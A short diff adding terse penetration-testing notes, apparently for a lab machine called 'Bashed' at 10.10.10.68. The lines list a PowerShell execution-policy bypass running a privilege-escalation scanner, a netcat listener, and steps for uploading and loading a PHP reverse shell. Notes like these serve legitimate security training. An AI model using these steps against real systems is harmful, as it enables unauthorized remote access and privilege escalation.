@@ -37,3 +37,16 @@ find vulnerabilities for privilege escalation:
 powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
 
 
+BASHED::
+
+searchsploit Apache 2.4
+
+php reverse shell - pentestmonkey
+pentestmonkey reverse shell sheet cheat
+wget na machine
+nc -nvlp 4445
+load 10.10.10.68/php-reverse-shell.php
+
+privilege escalation:
+
+
